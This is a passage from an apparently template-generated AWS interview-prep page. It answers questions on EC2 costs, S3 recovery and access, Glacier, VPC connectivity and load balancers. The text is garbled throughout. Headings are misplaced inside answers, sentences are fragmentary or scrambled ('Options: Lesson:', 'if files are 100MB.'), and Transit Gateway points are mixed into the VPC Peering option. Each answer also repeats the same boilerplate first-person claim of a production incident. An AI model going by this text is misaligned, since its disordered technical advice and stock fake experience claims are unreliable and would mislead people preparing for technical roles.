**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `EC2 & Compute` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `EC2 & Compute` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your On-Demand EC2 costs are very high. How would you optimize?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

---

- **Reserved Instances (RI)** — commit to 1 or 3 years for 40-60% discount. Best for steady-state production workloads.
- **Savings Plans** — more flexible than RIs. Commit to $/hour spend, apply across any instance type.
- **Spot Instances** — up to 90% discount. For fault-tolerant workloads (batch jobs, CI/CD workers, stateless web tier).
- **Right-sizing** — use AWS Compute Optimizer. Many instances are over-provisioned.

##### 2️⃣ Remediation & Permanent Safeguards

## 🔵 S3 & Storage ---

- **Graviton instances** — ARM-based (m7g, c7g) are 20-40% cheaper than x86 equivalents.
- **Auto Scaling** — scale in during off-hours. Don't run 10 instances at 2 AM if traffic drops to 1% of peak.
- **S3 + CloudFront for static content** — offload static serving from EC2.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Reserved Instances (RI) — commit to 1 or 3 years for 40-60% discount. Best for steady-state production workloads..

#### ⏱️ 60-Second Elevator Pitch Summary

- Reserved Instances (RI) — commit to 1 or 3 years for 40-60% discount. Best for steady-state produ...
- Savings Plans — more flexible than RIs. Commit to $/hour spend, apply across any instance type.
- Spot Instances — up to 90% discount. For fault-tolerant workloads (batch jobs, CI/CD workers, sta...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-23-aws-q7-you-accidentally-deleted-an-important-file-from-s3-how-do-you-recover-it-l1"></a>
### 23. AWS Q7: You accidentally deleted an important file from S3 How do you recover it [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `AWS` • `S3 & Storage` | **Type:** `Core Fundamentals [L1]`

**Tags:** `AWS` `S3 & Storage` `L1` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You accidentally deleted an important file from S3. How do you recover it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

If **versioning is enabled**: The delete created a "delete marker." You can recover by:

- Go to S3 console → show versions → find the version before the delete marker → restore it.
- `aws s3api list-object-versions --bucket  --prefix ` then `aws s3api get-object --version-id `.
- Check if you have a backup (S3 Replication to another bucket, AWS Backup).

##### 2️⃣ Remediation & Permanent Safeguards

If **versioning is NOT enabled**: The object is permanently deleted. Options: Lesson: Always enable versioning on important buckets. Enable MFA Delete for extra protection. ---

- Check CloudTrail for when it was deleted and by whom.
- No recovery possible without prior versioning or backup.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Go to S3 console → show versions → find the version before the delete marker → restore it..

#### ⏱️ 60-Second Elevator Pitch Summary

- Go to S3 console → show versions → find the version before the delete marker → restore it.
- aws s3api list-object-versions --bucket  --prefix  then aws s3api get-object --version-id .
- Check if you have a backup (S3 Replication to another bucket, AWS Backup).

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-24-aws-q8-your-s3-bucket-is-publicly-accessible-and-aws-sent-you-a-security-alert-how-do-you-fix-it-l2"></a>
### 24. AWS Q8: Your S3 bucket is publicly accessible and AWS sent you a security alert How do you fix it [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `S3 & Storage` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `S3 & Storage` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your S3 bucket is publicly accessible and AWS sent you a security alert. How do you fix it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

For legitimate public content (website assets): use **CloudFront** in front of a private S3 bucket instead of making the bucket public directly.

- **Block Public Access settings** — go to S3 → Block Public Access → Enable all four settings. This overrides any bucket/object ACLs and policies that grant public access.
- **Review bucket policy** — remove any `Principal: *` statements.
- **Review object ACLs** — remove `public-read` ACLs from objects.

##### 2️⃣ Remediation & Permanent Safeguards

---

- **Check for misconfigured static website hosting** — if not needed, disable it.
- **Enable S3 Access Analyzer** — finds all resource policies that allow external access.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Block Public Access settings — go to S3 → Block Public Access → Enable all four settings. This overrides any bucket/object ACLs an.

#### ⏱️ 60-Second Elevator Pitch Summary

- Block Public Access settings — go to S3 → Block Public Access → Enable all four settings. This ov...
- Review bucket policy — remove any Principal: * statements.
- Review object ACLs — remove public-read ACLs from objects.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-25-aws-q9-s3-uploads-from-your-app-are-failing-with-403-forbidden-what-are-the-possible-causes-l2"></a>
### 25. AWS Q9: S3 uploads from your app are failing with 403 Forbidden What are the possible causes [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `S3 & Storage` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `S3 & Storage` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"S3 uploads from your app are failing with `403 Forbidden`. What are the possible causes?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

---

- **IAM permissions** — the IAM role/user doesn't have `s3:PutObject` permission on the bucket.
- **Bucket policy denying access** — explicit Deny in bucket policy overrides IAM Allow.
- **Block Public Access** — if the app is trying to upload with public-read ACL and Block Public Access is enabled, it gets 403.
- **Wrong region** — bucket is in us-east-1 but app is hitting eu-west-1 endpoint. Use `--region` flag or set correct endpoint.

##### 2️⃣ Remediation & Permanent Safeguards

Execute the resolution runbook and verify workload health:

- **STS token expired** — if using temporary credentials (IAM role), the session token may have expired.
- **KMS encryption** — if the bucket enforces KMS encryption, the IAM role needs `kms:GenerateDataKey` permission on the KMS key.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: IAM permissions — the IAM role/user doesn't have s3:PutObject permission on the bucket..

#### ⏱️ 60-Second Elevator Pitch Summary

- IAM permissions — the IAM role/user doesn't have s3:PutObject permission on the bucket.
- Bucket policy denying access — explicit Deny in bucket policy overrides IAM Allow.
- Block Public Access — if the app is trying to upload with public-read ACL and Block Public Access...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-26-aws-q10-you-have-100tb-of-data-in-s3-that-is-accessed-very-infrequently-once-a-year-for-audit-how-do-you-minimize-storage-costs-l3"></a>
### 26. AWS Q10: You have 100TB of data in S3 that is accessed very infrequently (once a year for audit) How do you minimize storage costs [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `S3 & Storage` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `S3 & Storage` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You have 100TB of data in S3 that is accessed very infrequently (once a year for audit). How do you minimize storage costs?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Use **S3 Glacier Deep Archive** — cheapest storage class. ~$1/TB/month vs S3 Standard ~$23/TB/month.

- Use **S3 Lifecycle Policy** to auto-transition objects to Glacier after X days.
- Or directly upload to Glacier class if you know immediately it's archival.
- **S3 Intelligent-Tiering** — auto-moves between tiers based on access patterns (good if access pattern is unpredictable).

##### 2️⃣ Remediation & Permanent Safeguards

Retrieval: takes 12 hours. For audit use case, 12 hours is acceptable. If you need faster retrieval (hours not days), use **S3 Glacier Flexible Retrieval** (expedited: 1-5 min, standard: 3-5 hours). Setup: Also consider: ---

- **S3 Storage Lens** — visibility into which buckets/prefixes have stale data.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use S3 Lifecycle Policy to auto-transition objects to Glacier after X days..

#### ⏱️ 60-Second Elevator Pitch Summary

- Use S3 Lifecycle Policy to auto-transition objects to Glacier after X days.
- Or directly upload to Glacier class if you know immediately it's archival.
- S3 Intelligent-Tiering — auto-moves between tiers based on access patterns (good if access patter...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-27-aws-q11-how-do-you-securely-share-an-s3-object-with-an-external-partner-who-doesnt-have-an-aws-account-l2"></a>
### 27. AWS Q11: How do you securely share an S3 object with an external partner who doesnt have an AWS account [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `S3 & Storage` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `S3 & Storage` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How do you securely share an S3 object with an external partner who doesn't have an AWS account?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use **S3 Pre-Signed URLs**: This generates a time-limited URL. Anyone with the URL can download the file without AWS credentials. After expiry, the URL stops working. For uploads: `aws s3 presign --method PUT` generates a pre-signed URL for uploading. For long-term sharing: use **S3 Access Points** with a bucket policy, or give the partner a limited IAM user. Never make the bucket public — use pre-signed URLs for controlled sharing. ---

```bash
aws s3 presign s3://my-bucket/my-file.pdf --expires-in 3600
```

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use S3 Pre-Signed URLs:.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use S3 Pre-Signed URLs:
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-28-aws-q12-your-application-writes-millions-of-small-files-to-s3-performance-is-slow-on-listing-and-retrieval-how-do-you-optimize-l3"></a>
### 28. AWS Q12: Your application writes millions of small files to S3 Performance is slow on listing and retrieval How do you optimize [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `S3 & Storage` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `S3 & Storage` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your application writes millions of small files to S3. Performance is slow on listing and retrieval. How do you optimize?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

---

- **S3 automatically partitions by prefix** — requests are distributed across S3 partitions. More unique prefixes = better parallelism. Add a hash/timestamp prefix to distribute keys: `abc123/2024/01/filename` instead of `logs/filename`.
- **Avoid sequential keys** — old S3 had hot partition issues with sequential keys (dates). Modern S3 handles this better but prefixing is still good practice.
- **S3 Select or Athena** — for querying/filtering data, use S3 Select to retrieve only needed data instead of downloading entire files.
- **Aggregate small files** — if files are 100MB.

##### 2️⃣ Remediation & Permanent Safeguards

## 🟢 Networking & VPC ---

- **Request parallelism** — use multipart download with parallel part fetching for large files.
- **Batch operations** — for bulk operations on millions of objects, use S3 Batch Operations instead of single API calls.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: S3 automatically partitions by prefix — requests are distributed across S3 partitions. More unique prefixes = better parallelism. .

#### ⏱️ 60-Second Elevator Pitch Summary

- S3 automatically partitions by prefix — requests are distributed across S3 partitions. More uniqu...
- Avoid sequential keys — old S3 had hot partition issues with sequential keys (dates). Modern S3 h...
- S3 Select or Athena — for querying/filtering data, use S3 Select to retrieve only needed data ins...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-29-aws-q13-what-is-the-difference-between-a-security-group-and-a-network-acl-nacl-l1"></a>
### 29. AWS Q13: What is the difference between a Security Group and a Network ACL (NACL) [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `AWS` • `Networking & VPC` | **Type:** `Core Fundamentals [L1]`

**Tags:** `AWS` `Networking & VPC` `L1` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is the difference between a Security Group and a Network ACL (NACL)?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

| | Security Group | NACL | |---|---|---| | Level | Instance/ENI level | Subnet level | | Stateful | Yes — return traffic auto allowed | No — must allow inbound AND outbound explicitly | | Rules | Allow only | Allow and Deny | | Processing | All rules evaluated | Rules evaluated in order (lowest number first) | Example: If Security Group allows port 443 inbound, response traffic (outbound) is automatically allowed — you don't need an outbound rule. NACL — if you allow port 443 inbound, you must also add an outbound rule for the ephemeral ports (1024-65535) to allow the response. Use NACLs as a coarse subnet-level block (e.g., block a known bad IP range). Use Security Groups for fine-grained instance-level control. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: | | Security Group | NACL |.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: | | Security Group | NACL |
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-30-aws-q14-two-ec2-instances-in-the-same-vpc-cant-communicate-what-do-you-check-l2"></a>
### 30. AWS Q14: Two EC2 instances in the same VPC cant communicate What do you check [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Networking & VPC` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Networking & VPC` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Two EC2 instances in the same VPC can't communicate. What do you check?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

---

- **Same VPC?** — Confirm both are in the same VPC. Different VPCs require VPC Peering.
- **Security Groups** — instance A's SG must allow inbound from instance B's IP or SG. And B's SG must allow outbound (usually default allows all outbound).
- **NACL** — both subnet NACLs must allow inbound and outbound traffic between them.

##### 2️⃣ Remediation & Permanent Safeguards

Execute the resolution runbook and verify workload health:

- **Route tables** — both subnets must have routes to each other. In the same VPC, local routes (`10.0.0.0/16 → local`) handle this automatically.
- **Are they in different VPCs with peering?** — check the peering connection and route tables.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Same VPC? — Confirm both are in the same VPC. Different VPCs require VPC Peering..

#### ⏱️ 60-Second Elevator Pitch Summary

- Same VPC? — Confirm both are in the same VPC. Different VPCs require VPC Peering.
- Security Groups — instance A's SG must allow inbound from instance B's IP or SG. And B's SG must ...
- NACL — both subnet NACLs must allow inbound and outbound traffic between them.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-31-aws-q15-you-need-two-vpcs-in-different-aws-accounts-to-communicate-privately-how-do-you-set-this-up-l2"></a>
### 31. AWS Q15: You need two VPCs in different AWS accounts to communicate privately How do you set this up [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Networking & VPC` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Networking & VPC` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You need two VPCs in different AWS accounts to communicate privately. How do you set this up?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

**Option 1: VPC Peering**

- Create a peering connection between the two VPCs (cross-account supported).
- Accept the peering request in the other account.
- Update route tables in both VPCs to point to each other's CIDR via the peering connection.
- Update Security Groups to allow traffic from the other VPC's CIDR.
- Central hub. Connect all VPCs (and on-prem) to TGW.
- Fully transitive. Any connected VPC can reach any other.

##### 2️⃣ Remediation & Permanent Safeguards

Limitation: Not transitive. If VPC A peers with B, and B peers with C, A can't talk to C through B. **Option 2: AWS Transit Gateway** **Option 3: AWS PrivateLink** ---

- Better for many VPCs. Costs more than peering.
- Expose a specific service (not the whole VPC) across accounts.
- The consumer VPC creates an Interface Endpoint pointing to the provider's endpoint service.
- Traffic stays on AWS backbone.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Create a peering connection between the two VPCs (cross-account supported)..

#### ⏱️ 60-Second Elevator Pitch Summary

- Create a peering connection between the two VPCs (cross-account supported).
- Accept the peering request in the other account.
- Update route tables in both VPCs to point to each other's CIDR via the peering connection.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-32-aws-q16-your-vpc-has-overlapping-cidr-blocks-with-an-on-premises-network-and-you-need-to-connect-them-via-vpn-what-do-you-do-l3"></a>
### 32. AWS Q16: Your VPC has overlapping CIDR blocks with an on-premises network and you need to connect them via VPN What do you do [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Networking & VPC` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Networking & VPC` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your VPC has overlapping CIDR blocks with an on-premises network and you need to connect them via VPN. What do you do?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Overlapping CIDRs are a real problem — traffic routing becomes ambiguous.

- **Re-IP the VPC** — If the VPC is new/small, change the CIDR by creating a new VPC with a non-overlapping range and migrating.
- **NAT at the VPN gateway** — Use a NAT device that translates VPC IPs to a non-overlapping range before traffic crosses the VPN. AWS doesn't natively support NAT-T for VPN in this case; you'd use an EC2-based NAT instance.
- **AWS Transit Gateway with NAT** — TGW supports NAT-based routing for overlapping CIDRs in some configurations.

##### 2️⃣ Remediation & Permanent Safeguards

Options: Best practice: **Plan CIDR ranges before creating VPCs.** Use RFC1918 ranges with /16 subnets, ensuring no overlap between VPCs and on-prem. Document in a CMDB. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Re-IP the VPC — If the VPC is new/small, change the CIDR by creating a new VPC with a non-overlapping range and migrating..

#### ⏱️ 60-Second Elevator Pitch Summary

- Re-IP the VPC — If the VPC is new/small, change the CIDR by creating a new VPC with a non-overlap...
- NAT at the VPN gateway — Use a NAT device that translates VPC IPs to a non-overlapping range befo...
- AWS Transit Gateway with NAT — TGW supports NAT-based routing for overlapping CIDRs in some confi...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-33-aws-q17-what-is-vpc-flow-logs-and-how-do-you-use-it-for-security-investigations-l2"></a>
### 33. AWS Q17: What is VPC Flow Logs and how do you use it for security investigations [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Networking & VPC` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Networking & VPC` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is VPC Flow Logs and how do you use it for security investigations?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

VPC Flow Logs captures IP traffic information for network interfaces in your VPC. Logged to CloudWatch Logs or S3.

- **Security investigation** — "Where did this attack come from?" Filter logs for a suspicious IP.
- **Detecting port scans** — many REJECT records from same source IP across many ports.
- **Troubleshooting connectivity** — if traffic shows REJECT, a security group or NACL is blocking it.

##### 2️⃣ Remediation & Permanent Safeguards

Each record includes: source IP, destination IP, source port, destination port, protocol, bytes, action (ACCEPT/REJECT), etc. Use cases: Query with **Athena** for large-scale analysis. Set up **CloudWatch Logs Insights** for real-time querying. ---

- **Billing anomalies** — high data transfer costs. Flow logs show which IP is generating the traffic.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Security investigation — "Where did this attack come from?" Filter logs for a suspicious IP..

#### ⏱️ 60-Second Elevator Pitch Summary

- Security investigation — "Where did this attack come from?" Filter logs for a suspicious IP.
- Detecting port scans — many REJECT records from same source IP across many ports.
- Troubleshooting connectivity — if traffic shows REJECT, a security group or NACL is blocking it.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-34-aws-q18-you-need-to-connect-your-aws-vpc-to-an-on-premises-data-center-what-are-the-options-and-tradeoffs-l3"></a>
### 34. AWS Q18: You need to connect your AWS VPC to an on-premises data center What are the options and tradeoffs [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Networking & VPC` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Networking & VPC` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You need to connect your AWS VPC to an on-premises data center. What are the options and tradeoffs?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

**Option 1: AWS Site-to-Site VPN**

- Encrypted tunnel over the public internet.
- Quick to set up (minutes to hours).
- Bandwidth: up to 1.25 Gbps.
- Variable latency (public internet).
- Cost: ~$36/month + data transfer.
- Dedicated physical connection to AWS via AWS Direct Connect locations.
- Bandwidth: 1 Gbps to 100 Gbps.

##### 2️⃣ Remediation & Permanent Safeguards

**Option 2: AWS Direct Connect** **Option 3: VPN over Direct Connect** Choose VPN for quick/cheap connectivity. Choose Direct Connect for high bandwidth, compliance requirements (data never on public internet), or consistent latency needs. ---

- Consistent low latency.
- Takes weeks to months to provision.
- Higher cost but predictable.
- Encrypted VPN tunnel over the Direct Connect private circuit.
- Get Direct Connect speed + VPN encryption.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Encrypted tunnel over the public internet..

#### ⏱️ 60-Second Elevator Pitch Summary

- Encrypted tunnel over the public internet.
- Quick to set up (minutes to hours).
- Bandwidth: up to 1.25 Gbps.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-35-aws-q19-what-is-an-elastic-load-balancer-and-what-are-the-differences-between-alb-nlb-and-clb-l2"></a>
### 35. AWS Q19: What is an Elastic Load Balancer and what are the differences between ALB NLB and CLB [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Networking & VPC` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Networking & VPC` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is an Elastic Load Balancer and what are the differences between ALB, NLB, and CLB?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Choose: ALB for web apps/APIs. NLB for TCP/UDP or when you need static IP. GWLB for network security appliances.

- **CLB (Classic Load Balancer)** — legacy. Avoid for new projects. Layer 4 and Layer 7 but limited features.
- **ALB (Application Load Balancer)** — Layer 7 (HTTP/HTTPS). Content-based routing: route by URL path, hostname, headers, query strings. Best for microservices and HTTP apps. Supports WebSockets, HTTP/2.
- **NLB (Network Load Balancer)** — Layer 4 (TCP/UDP/TLS). Ultra-low latency. Handles millions of requests per second. Static IP / Elastic IP support. Best for high-performance, non-HTTP workloads (game servers, IoT, VoIP).

##### 2️⃣ Remediation & Permanent Safeguards

---

- **GWLB (Gateway Load Balancer)** — for inline network appliances (firewalls, IDS/IPS). Newer addition.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: CLB (Classic Load Balancer) — legacy. Avoid for new projects. Layer 4 and Layer 7 but limited features..

#### ⏱️ 60-Second Elevator Pitch Summary

- CLB (Classic Load Balancer) — legacy. Avoid for new projects. Layer 4 and Layer 7 but limited fea...
- ALB (Application Load Balancer) — Layer 7 (HTTP/HTTPS). Content-based routing: route by URL path,...
- NLB (Network Load Balancer) — Layer 4 (TCP/UDP/TLS). Ultra-low latency. Handles millions of reque...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-36-aws-q20-your-alb-target-group-is-showing-all-instances-as-unhealthy-what-do-you-check-l2"></a>
### 36. AWS Q20: Your ALB target group is showing all instances as unhealthy What do you check [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Networking & VPC` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Networking & VPC` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your ALB target group is showing all instances as unhealthy. What do you check?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

---

- **Health check path** — does the path exist? `curl http://:` from the ALB's subnet.
- **Security group** — the ALB's Security Group must be allowed to reach the instance on the health check port. Add inbound rule to instance SG: allow from ALB SG.
- **Instance running the app** — is the application actually running on that port? `netstat -tlnp | grep `.

##### 2️⃣ Remediation & Permanent Safeguards

## 🟡 IAM & Security ---

- **Health check port** — is it the traffic port or a different one? Misconfiguration here is common.
- **Response code** — the health check expects 200. If the app returns 301 redirect, that's a failure by default. Add 301 to success codes or fix the redirect.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Health check path — does the path exist? curl http://: from the ALB's subnet..

#### ⏱️ 60-Second Elevator Pitch Summary

- Health check path — does the path exist? curl http://: from the ALB's subnet.
- Security group — the ALB's Security Group must be allowed to reach the instance on the health che...
